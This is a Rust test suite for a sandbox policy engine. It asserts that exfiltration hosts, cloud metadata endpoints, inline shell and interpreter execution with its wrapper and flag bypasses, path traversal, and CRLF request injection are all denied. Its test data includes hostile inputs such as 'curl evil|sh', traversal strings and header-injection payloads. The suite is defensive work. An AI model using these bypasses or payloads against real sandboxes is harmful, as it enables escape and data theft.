//! Escape suite v1 (I1/I6): every exfil path must be denied + audited at Tier0.
//! Real KVM tests run nightly; these run every commit without privs.
use toolcage_policy as policy;

fn sample() -> policy::Policy {
    policy::load_yaml(include_str!("../../../schemas/policy-v0.yaml")).unwrap()
}

fn net(host: &str) -> policy::Request {
    policy::Request {
        action: "http.request".into(),
        host: Some(host.into()),
        method: Some("GET".into()),
        path: Some("/".into()),
        fs_path: None,
        argv: None,
    }
}

#[test]
fn raw_exfil_paths_blocked() {
    let p = sample();
    // Raw/packet/DNS/ICMP/IPv6/metadata have no proxy path -> default deny.
    for h in [
        "169.254.169.254",
        "metadata.google.internal",
        "instance-data",
        "evil.example.com",
        "dns-tunnel.example.com",
    ] {
        let d = policy::decide(&p, &net(h));
        assert!(!d.allow, "{h} must be denied");
    }
}

#[test]
fn proxy_alias_cannot_smuggle_host() {
    // Guest asking for alias "github" with evil path must still be path-checked.
    let p = sample();
    let d = policy::decide(
        &p,
        &policy::Request {
            action: "http.request".into(),
            host: Some("github".into()),
            method: Some("POST".into()),
            path: Some("/repos/evil/x".into()),
            fs_path: None,
            argv: None,
        },
    );
    assert!(!d.allow);
}

#[test]
fn shell_and_interpreter_inline_blocked() {
    let p = sample();
    // Shells with any inline-command flag (-c, -lc, -cic, ...) are denied,
    // not just the old exact `-c`/`-lc` match.
    for argv in [
        vec!["bash".to_string(), "-ic".to_string(), "id".to_string()],
        vec!["dash".to_string(), "-c".to_string(), "id".to_string()],
        vec!["zsh".to_string(), "-c".to_string(), "id".to_string()],
        vec!["ksh".to_string(), "-c".to_string(), "id".to_string()],
        vec![
            "/bin/busybox".to_string(),
            "sh".to_string(),
            "-c".to_string(),
            "id".to_string(),
        ],
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.clone()),
            },
        );
        assert!(!d.allow, "{argv:?} must be denied");
    }
    // Interpreters fed inline code are denied.
    for (bin, flag, code) in [
        ("python", "-c", "print(1)"),
        ("python3", "-c", "print(1)"),
        ("perl", "-e", "print 1"),
        ("ruby", "-e", "puts 1"),
        ("node", "-e", "console.log(1)"),
        ("lua", "-e", "print(1)"),
        ("php", "-r", "echo 1;"),
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(vec![bin.to_string(), flag.to_string(), code.to_string()]),
            },
        );
        assert!(!d.allow, "{bin} {flag} must be denied");
    }
}

#[test]
fn shell_and_interpreter_bypasses_blocked() {
    let p = sample();
    let denied = |argv: Vec<&str>| {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.iter().map(|s| s.to_string()).collect()),
            },
        );
        assert!(!d.allow, "{argv:?} must be denied");
    };
    // Joined inline-code flag (`python3 -cprint(1)`, `perl -e'code'`).
    denied(vec!["python3", "-cprint(1)"]);
    denied(vec!["perl", "-e'print 1'"]);
    denied(vec!["php", "-r'echo 1;"]);
    // Versioned / renamed binaries (`python3.12`, `perl5`, `bash5`).
    denied(vec!["python3.12", "-c", "print(1)"]);
    denied(vec!["perl5", "-e", "print 1"]);
    denied(vec!["bash5", "-c", "id"]);
    // Shell reached through `env` (argv[0] is not itself a shell).
    denied(vec!["env", "sh", "-c", "curl evil|sh"]);
    denied(vec!["env", "bash5", "-c", "id"]);
    // A shell script file is the same risk class as `sh -c`.
    denied(vec!["sh", "evil.sh"]);
    denied(vec!["bash", "script.sh"]);
    denied(vec!["/bin/busybox", "sh", "evil.sh"]);

    // Interpreters reached through a wrapper must be caught the same as when
    // they are argv[0]: the check used to look only at argv[0], so
    // `env python3 -c` slipped past while `python3 -c` was denied.
    denied(vec!["env", "python3", "-c", "print(1)"]);
    denied(vec!["nice", "python3", "-c", "print(1)"]);
    denied(vec!["timeout", "5", "python3", "-c", "print(1)"]);
    denied(vec!["env", "perl5", "-E", "system 1"]);
    denied(vec!["/usr/bin/env", "python3.12", "-c", "print(1)"]);

    // Every spelling of the inline-code flag, not just the lowercase one:
    // `perl -E`, `node -p`, `node --eval=`, `php -R` all execute arbitrary
    // code exactly like the denied `-e`/`-r` forms.
    denied(vec!["perl", "-E", "system 1"]);
    denied(vec!["ruby", "-E", "system 1"]);
    denied(vec!["node", "-p", "1"]);
    denied(vec!["node", "-P", "1"]);
    denied(vec!["node", "--eval=1"]);
    denied(vec!["node", "--print=1"]);
    denied(vec!["php", "-R", "echo 1;"]);
    denied(vec!["python3", "-C", "print(1)"]);

    // No false positives: non-interpreters with look-alike flags, and
    // interpreters running a script file, stay allowed.
    let allowed = |argv: Vec<&str>| {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.iter().map(|s| s.to_string()).collect()),
            },
        );
        assert!(d.allow, "{argv:?} must be allowed");
    };
    allowed(vec!["grep", "-c", "x"]);
    allowed(vec!["python", "script.py"]);
    allowed(vec!["/bin/ls", "-la"]);
}

#[test]
fn shell_flags_without_inline_code_allowed() {
    let p = sample();
    // Options that don't run a string must not be false-positively denied.
    for argv in [
        vec!["bash".to_string(), "--noprofile".to_string()],
        vec!["bash".to_string(), "-x".to_string()],
        vec!["/bin/ls".to_string(), "-la".to_string()],
        vec!["python".to_string(), "script.py".to_string()],
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv.clone()),
            },
        );
        assert!(d.allow, "{argv:?} must be allowed");
    }
}

#[test]
fn shell_escape_blocked() {
    let p = sample();
    for argv in [
        vec!["sh".to_string(), "-c".to_string(), "id".to_string()],
        vec!["/bin/bash".to_string(), "-lc".to_string(), "id".to_string()],
    ] {
        let d = policy::decide(
            &p,
            &policy::Request {
                action: "proc.exec".into(),
                host: None,
                method: None,
                path: None,
                fs_path: None,
                argv: Some(argv),
            },
        );
        assert!(!d.allow);
    }
}

fn at(host: &str, method: &str, path: &str) -> policy::Request {
    policy::Request {
        action: "http.request".into(),
        host: Some(host.into()),
        method: Some(method.into()),
        path: Some(path.into()),
        fs_path: None,
        argv: None,
    }
}

#[test]
fn request_target_traversal_denied() {
    // `github` allows /repos/acme/app/**. A traversal that matches that prefix
    // as a string but resolves outside it upstream must be refused before any
    // rule matching — otherwise the rule that is checked is not the resource
    // that gets served.
    let p = sample();
    for path in [
        "/repos/acme/app/../../../orgs/evil/repos",
        "/repos/acme/app/../../..",
        "/repos/acme/app/./../other",
        "/repos/acme/app/%2e%2e/%2e%2e/evil",
        "/repos/acme/app/%2E%2E/evil",
        "/repos/acme/app/%2fetc",
        "/repos/acme/app/x%5c..%5cevil",
        // absolute-form target: not rooted where it claims to be
        "https://evil.example.com/repos/acme/app/x",
    ] {
        let d = policy::decide(&p, &at("github", "GET", path));
        assert!(!d.allow, "traversal target must be denied: {path}");
        assert_eq!(
            d.rule_ids,
            vec!["deny:request-target".to_string()],
            "{path}"
        );
    }
}

#[test]
fn request_line_injection_denied() {
    // The method and path are written verbatim into the upstream request line.
    // A CR/LF/NUL/space there injects headers or a second request on the
    // connection that carries the broker-injected Authorization header.
    let p = sample();
    for path in [
        "/repos/acme/app/x HTTP/1.1\r\nX-Injected: 1\r\n\r\nGET /smuggled",
        "/repos/acme/app/x\r\nX-Injected: 1",
        "/repos/acme/app/x\nX-Injected: 1",
        "/repos/acme/app/x\0/extra",
        "/repos/acme/app/x name",
    ] {
        let d = policy::decide(&p, &at("github", "GET", path));
        assert!(!d.allow, "injected target must be denied: {path:?}");
        assert_eq!(d.rule_ids, vec!["deny:request-target".to_string()]);
    }
    for method in [
        "GET / HTTP/1.1\r\nX: 1",
        "GET\r\nX: 1",
        "GET POST",
        "GE\0T",
        "",
    ] {
        let d = policy::decide(&p, &at("github", method, "/repos/acme/app/x"));
        assert!(!d.allow, "injected method must be denied: {method:?}");
        assert_eq!(d.rule_ids, vec!["deny:request-target".to_string()]);
    }
}

#[test]
fn clean_request_target_still_allowed() {
    // The hygiene check must not break legitimate traffic.
    let p = sample();
    for path in [
        "/repos/acme/app",
        "/repos/acme/app/",
        "/repos/acme/app/pulls/12",
        // A query string is a legal request target; the upstream does not
        // resolve it as a path, so it stays allowed (and its own separators
        // are not traversal).
        "/repos/acme/app/pulls?state=open",
    ] {
        let d = policy::decide(&p, &at("github", "GET", path));
        assert!(d.allow, "clean target must be allowed: {path} ({d:?})");
    }
    // POST is allowed by the rule (approval is enforced above policy).
    assert!(policy::decide(&p, &at("github", "POST", "/repos/acme/app/x")).allow);
}

fn exec_dec(p: &policy::Policy, argv: Option<Vec<&str>>) -> policy::Decision {
    policy::decide(
        p,
        &policy::Request {
            action: "proc.exec".into(),
            host: None,
            method: None,
            path: None,
            fs_path: None,
            argv: argv.map(|v| v.into_iter().map(|s| s.to_string()).collect()),
        },
    )
}

#[test]
fn exec_allowlist_blocks_everything_not_listed() {
    // The denylist is inherently incomplete (wrappers, renamed binaries, new
    // flag spellings). An explicit allowlist closes the class: when configured,
    // ONLY the listed binaries run.
    let p = policy::load_yaml(
        r#"
tool: t
version: 0
exec:
  allowlist:
    - ls
    - cat
"#,
    )
    .unwrap();
    // Listed binaries run (matched on argv[0] basename, with a path prefix).
    assert!(exec_dec(&p, Some(vec!["ls", "-la"])).allow);
    assert!(exec_dec(&p, Some(vec!["/bin/cat", "file"])).allow);
    assert!(exec_dec(&p, Some(vec!["ls3.2"])).allow, "version tolerance");
    // Everything else is denied, including the shapes the denylist misses.
    for argv in [
        vec!["git", "status"],
        vec!["bash"],
        vec!["env", "python3", "-c", "code"],
        vec!["python3", "script.py"],
        vec!["python3.12", "script.py"],
        vec!["sh", "-c", "id"],
    ] {
        let d = exec_dec(&p, Some(argv.clone()));
        assert!(!d.allow, "{argv:?} must not be in the allowlist");
        assert_eq!(d.rule_ids, vec!["deny:exec-not-allowlisted".to_string()]);
    }
}

#[test]
fn exec_allowlist_still_enforces_the_denylist() {
    // Allowing a binary does not allow arbitrary code through it: the denylist
    // still blocks inline code and shell script files.
    let p = policy::load_yaml(
        r#"
tool: t
version: 0
exec:
  allowlist:
    - python3
    - sh
    - perl
"#,
    )
    .unwrap();
    assert!(exec_dec(&p, Some(vec!["python3", "script.py"])).allow);
    for argv in [
        vec!["python3", "-c", "code"],
        vec!["python3", "-cprint(1)"],
        vec!["sh", "-c", "id"],
        vec!["sh", "evil.sh"],
        vec!["perl", "-E", "system 1"],
    ] {
        let d = exec_dec(&p, Some(argv.clone()));
        assert!(
            !d.allow,
            "allowlisted but dangerous form must be denied: {argv:?}"
        );
    }
}

#[test]
fn proc_exec_without_argv_is_denied() {
    // An exec with no argv authorizes nothing; it used to skip every check.
    let p = policy::load_yaml("tool: t\nversion: 0\n").unwrap();
    for argv in [None, Some(vec![])] {
        let d = exec_dec(&p, argv.clone());
        assert!(!d.allow, "{argv:?} must be denied");
        assert_eq!(d.rule_ids, vec!["deny:exec-no-argv".to_string()]);
    }
}

#[test]
fn absent_method_cannot_escape_a_get_gate() {
    // decide() used to default a missing method to GET — the request acquired
    // every `methods: [GET]` rule's privileges — while needs_approval saw ""
    // and skipped gates written for GET. Both sides must agree: an absent
    // method is unknown, and unknown can neither inherit privileges nor dodge
    // obligations.
    let p = policy::load_yaml(
        r#"
tool: t
version: 0
net:
  mode: allowlist
  hosts:
    - host: github
      methods: [GET]
approval:
  require_for:
    - http.request: { methods: [GET], hosts: [github] }
"#,
    )
    .unwrap();
    // Explicit method: consistent — GET is allowed and gated, POST is denied.
    assert!(policy::decide(&p, &at("github", "GET", "/")).allow);
    assert!(p.needs_approval("http.request", Some("GET"), Some("github")));
    assert!(!policy::decide(&p, &at("github", "POST", "/")).allow);
    assert!(!p.needs_approval("http.request", Some("DELETE"), Some("github")));

    // Absent method: must not inherit GET's allow ...
    let d = policy::decide(
        &p,
        &policy::Request {
            action: "http.request".into(),
            host: Some("github".into()),
            method: None,
            path: Some("/".into()),
            fs_path: None,
            argv: None,
        },
    );
    assert!(
        !d.allow,
        "absent method must not inherit GET privileges: {d:?}"
    );
    assert_eq!(d.rule_ids, vec!["deny:method-missing".to_string()]);
    // ... and must not escape GET's approval gate.
    assert!(
        p.needs_approval("http.request", None, Some("github")),
        "absent method must not dodge a GET approval gate"
    );
    // An unknown host is unknown too, not a non-match.
    assert!(p.needs_approval("http.request", Some("GET"), None));
}

#[test]
fn mount_mode_typo_cannot_open_writes() {
    // The deny check was `mode == "ro"` — every unrecognized spelling
    // ("readonly", "read-only", "r0", "") silently became WRITABLE. A typo on
    // a read-only mount is exactly the case that must not open a write path:
    // only an explicit rw may permit writes.
    let pol = |mode: &str| {
        policy::load_yaml(&format!(
            r#"
tool: t
version: 0
fs:
  mounts:
    - path: /workspace
      mode: {mode}
"#
        ))
    };
    let fs = |p: &policy::Policy, action: &str| {
        policy::decide(
            p,
            &policy::Request {
                action: action.into(),
                host: None,
                method: None,
                path: None,
                fs_path: Some("/workspace/file".into()),
                argv: None,
            },
        )
    };
    // Unrecognized spellings must not open writes (and must not at load).
    for mode in ["readonly", "read-only", "r0", "READ-ONLY"] {
        assert!(
            pol(mode).is_err(),
            "unknown mount mode {mode:?} must fail at load"
        );
    }
    // A structurally-built policy (bypassing load) must fail closed too.
    let typo = policy::Policy {
        tool: "t".into(),
        min_isolation: "tier0".into(),
        fs: policy::FsPolicy {
            mounts: vec![policy::Mount {
                path: "/workspace".into(),
                mode: "readonly".into(),
                source: String::new(),
            }],
        },
        net: Default::default(),
        credentials: vec![],
        approval: Default::default(),
        limits: Default::default(),
        exec: Default::default(),
    };
    assert!(
        !fs(&typo, "fs.write").allow,
        "typo'd mode must not allow writes"
    );
    assert!(
        fs(&typo, "fs.read").allow,
        "reads under the mount stay allowed"
    );
    // Explicit rw allows writes (any case); ro denies them.
    for mode in ["rw", "RW"] {
        let p = pol(mode).unwrap();
        assert!(fs(&p, "fs.write").allow, "{mode} must allow writes");
    }
    for mode in ["ro", "RO"] {
        let p = pol(mode).unwrap();
        assert!(!fs(&p, "fs.write").allow, "{mode} must deny writes");
        assert!(fs(&p, "fs.read").allow);
    }
    // Unknown net mode spellings fail at load as well.
    assert!(policy::load_yaml("tool: t\nversion: 0\nnet:\n  mode: alowlist\n").is_err());
    assert!(policy::load_yaml("tool: t\nversion: 0\nnet:\n  mode: allowlist\n").is_ok());
}

#[test]
fn overlapping_mounts_cannot_shadow_read_only() {
    // First-match-wins let a narrow rw mount listed BEFORE a read-only parent
    // re-open writes under the parent (and the same mounts in the other order
    // denied). Every covering mount must agree: a write needs all of them.
    let dec = |mounts: &str, action: &str, path: &str| {
        let p =
            policy::load_yaml(&format!("tool: t\nversion: 0\nfs:\n  mounts:\n{mounts}")).unwrap();
        policy::decide(
            &p,
            &policy::Request {
                action: action.into(),
                host: None,
                method: None,
                path: None,
                fs_path: Some(path.into()),
                argv: None,
            },
        )
    };
    let ro_parent = "    - path: /workspace\n      mode: ro\n";
    let rw_child = "    - path: /workspace/in\n      mode: rw\n";
    // Order must not matter: either way the ro parent governs writes.
    for mounts in [
        format!("{ro_parent}{rw_child}"),
        format!("{rw_child}{ro_parent}"),
    ] {
        let d = dec(&mounts, "fs.write", "/workspace/in/x");
        assert!(!d.allow, "ro parent must govern: {mounts:?} -> {d:?}");
        assert_eq!(d.rule_ids, vec!["fs:deny-ro".to_string()]);
        // Reads are fine under both.
        assert!(dec(&mounts, "fs.read", "/workspace/in/x").allow);
    }
    // Without the ro parent the child is writable.
    assert!(dec(rw_child, "fs.write", "/workspace/in/x").allow);
    // Duplicate paths: the read-only one wins.
    let dup = format!("{rw_child}    - path: /workspace/in\n      mode: ro\n");
    assert!(!dec(&dup, "fs.write", "/workspace/in/x").allow);
}
